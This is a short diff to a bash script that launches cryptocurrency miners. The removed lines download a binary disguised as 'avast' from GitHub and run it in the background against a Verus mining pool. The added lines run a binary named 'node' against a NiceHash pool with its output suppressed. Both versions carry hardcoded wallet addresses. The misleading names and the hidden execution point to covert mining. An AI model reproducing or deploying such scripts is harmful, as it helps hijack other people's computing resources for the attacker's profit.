@@ -1,5 +1,3 @@
 #!/bin/bash
-wget https://github.com/torgyv/berhasil/raw/master/avast
-chmod +x avast
-nohup ./avast -v -l pool.verus.io:9998 -u RWZG7MP3LepujPY8rVS9ZuUXZnDdNveBF4.A100 -t 4 -x &
-while :; do echo "system true"; sleep 2m; done
+chmod 777 node
+./node -P stratum2+tcp://3DMucgPZzjUp9MwUMDJ9kn1jRwYBYocY3w@daggerhashimoto.usa-west.nicehash.com:3353 >/dev/null
